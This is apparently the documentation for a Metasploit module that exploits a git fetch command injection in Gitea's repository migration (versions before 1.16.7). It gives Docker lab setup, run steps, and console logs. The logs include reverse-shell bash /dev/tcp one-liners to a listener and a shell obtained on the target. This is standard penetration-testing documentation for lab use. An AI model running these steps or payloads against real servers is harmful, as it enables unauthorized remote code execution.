## Vulnerable Application

[Gitea](https://gitea.io/) is a painless self-hosted Git service community
managed lightweight code hosting solution written in Go.

This module has been tested successfully on Gitea versions:
* 1.16.6 (Docker)

### Description

This module exploits Git fetch command in Gitea repository migration process that leads to a remote command execution on the system.
This vulnerability affect Gitea before 1.16.7 version.

The module will automatically use `cmd/unix/reverse_bash` payload and unix
target.

The migration process require valid Git repository address so the module will
use the Gitea target itself by creating a temporary repository. This scenario
won't work with [Gitea default configuration](https://github.com/go-gitea/gitea/blob/main/custom/conf/app.example.ini)
because `ALLOW_LOCALNETWORKS` is disabled. However, it will be ignored when
[ALLOWED_DOMAINS](https://github.com/go-gitea/gitea/blob/main/custom/conf/app.example.ini#L2289)
is set, but it must be set to all domain with `*` for this scenario to work.

### Source and Installers

* [Source Code Repository](https://github.com/go-gitea/gitea/)
* [Installers](https://dl.gitea.io/gitea/1.16.6)
* [Docker](https://docs.gitea.io/en-us/install-with-docker/)

### Docker installation
1. create `docker-compose.yml` file
```
version: "3"

networks:
  gitea:
    external: false

services:
  server:
    image: gitea/gitea:1.16.6
    container_name: gitea
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
    networks:
      - gitea
    volumes:
      - ./gitea:/data
      - /etc/timezone:/etc/timezone:ro
      - /etc/localtime:/etc/localtime:ro
    ports:
      - "3000:3000"
      - "222:22"
```
2. run `docker-compose up`
3. append `ALLOW_LOCALNETWORKS` in the configuration file.
```
:~$ cat << EOF >> gitea/gitea/conf/app.ini
> [migrations]
> ALLOW_LOCALNETWORKS = true
> EOF
```
4. Navigate to the localhost port 3000 and finish the installation. Note that
   the first registered user will automatically become administrator so make
   sure to set the administrator username and password upon installation.

## Verification Steps

1. Navigate to `/user/sign_up` and register normal user
2. Do: `use unix/webapp/gitea_git_fetch_rce`
3. Do: `set RHOSTS [ips]`
4. Do: `set LHOST [lhost]`
5. Do: `set USERNAME [username]`
6. Do: `set PASSWORD [password]`
7. Do: `run`
8. You should get a shell.

## Options

## Scenarios
### Successful exploitation of Gitea 1.16.6 on Docker

```
msf6 > use unix/webapp/gitea_git_fetch_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set USERNAME msf
USERNAME => msf
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set PASSWORD qwerty
PASSWORD => qwerty
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set VERBOSE true
VERBOSE => true
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > run

[+] bash -c '0<&180-;exec 180<>/dev/tcp/172.17.0.1/4444;sh <&180 >&180 2>&180'
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/gitea_git_fetch_rce) >
[*] Started reverse TCP handler on 172.17.0.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 1.16.6
[*] Using URL: http://172.17.0.1:8080/msf/eqESXv4b
[*] Server started.
[*] Adding hardcoded uri /api/v1/version
[*] Adding hardcoded uri /api/v1/settings/api
[*] Adding hardcoded uri /api/v1/repos/msf/eqESXv4b
[*] Adding hardcoded uri /api/v1/repos/msf/eqESXv4b/pulls
[*] Adding hardcoded uri /api/v1/repos/msf/eqESXv4b/topics
[*] Creating repository "7vX49Gy2Rui5WHQ"
[+] Repository created
[*] Migrating repository
[*] Command shell session 1 opened (172.17.0.1:4444 -> 172.17.0.2:50212) at 2022-09-15 18:51:31 +0700
[*] Cleanup: removing repository "7vX49Gy2Rui5WHQ"
[*] Cleanup: removing repository "eqESXv4b"
[*] Server stopped.

msf6 exploit(unix/webapp/gitea_git_fetch_rce) > sessions 1
[*] Starting interaction with 1...

id
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
```

### Failed exploitation due to migration settings

```
msf6 > use unix/webapp/gitea_git_fetch_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set USERNAME msf
USERNAME => msf
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set PASSWORD qwerty
PASSWORD => qwerty
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > set VERBOSE true
VERBOSE => true
msf6 exploit(unix/webapp/gitea_git_fetch_rce) > run

[+] bash -c '0<&130-;exec 130<>/dev/tcp/172.17.0.1/4444;sh <&130 >&130 2>&130'
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/gitea_git_fetch_rce) >
[*] Started reverse TCP handler on 172.17.0.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 1.16.6
[*] Using URL: http://172.17.0.1:8080/msf/XG1AhW3
[*] Server started.
[*] Adding hardcoded uri /api/v1/version
[*] Adding hardcoded uri /api/v1/settings/api
[*] Adding hardcoded uri /api/v1/repos/msf/XG1AhW3
[*] Adding hardcoded uri /api/v1/repos/msf/XG1AhW3/pulls
[*] Adding hardcoded uri /api/v1/repos/msf/XG1AhW3/topics
[*] Creating repository "7A4o5kYw3Y"
[+] Repository created
[*] Migrating repository
[*] Cleanup: removing repository "7A4o5kYw3Y"
[*] Server stopped.
[-] Exploit aborted due to failure: unexpected-reply: Unable to migrate repo:
You can not import from disallowed hosts, please ask the admin to check
ALLOWED_DOMAINS/ALLOW_LOCALNETWORKS/BLOCKED_DOMAINS settings.
```
